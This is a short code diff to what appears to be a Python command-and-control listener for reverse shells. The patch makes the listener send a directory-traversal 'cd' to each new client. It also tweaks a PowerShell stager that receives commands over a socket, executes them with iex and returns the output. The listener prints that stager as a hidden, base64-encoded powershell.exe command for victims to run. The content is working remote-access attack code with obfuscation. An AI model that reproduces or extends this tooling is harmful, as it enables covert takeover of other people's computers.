@@ -81,6 +81,8 @@ def startClientListener():
             clientnumber += 1
             sys.stdout.write('\r' + t.bold_green + "connection from %s %s"%(ip,port) + t.normal + '\n>')
             sys.stdout.flush()
+            clientconn.sendall("cd ../../../../../../")
+            clientconn.recv(20)
 
             worker = Thread(target=pingClients, args=(clientconn,clientnumber))
             worker.setDaemon(True)
@@ -151,7 +153,7 @@ def printListener():
         "$sb = New-Object -TypeName System.Text.ASCIIEncoding; $d = $sb.GetString($b,0, $i);"
         "$cb = (iex -c $d 2>&1 | Out-String);"
         "$br = $cb + ($error[0] | Out-String) + \"\x00\";$error.clear();"
-        "$sb = ([text.encoding]::ASCII).GetBytes($br);$sl.Write($sb,0,$sb.Length)};$c.Close()")
+        "$sb = ([text.encoding]::ASCII).GetBytes($br);$sl.Write($sb,0,$sb.Length);$sl.Flush()};$c.Close()")
 
     print 'powershell.exe -WindowStyle Hidden -NonInteractive -enc ' + windows_powershell_stager.encode('utf_16_le').encode('base64').replace('\n','')
     return True
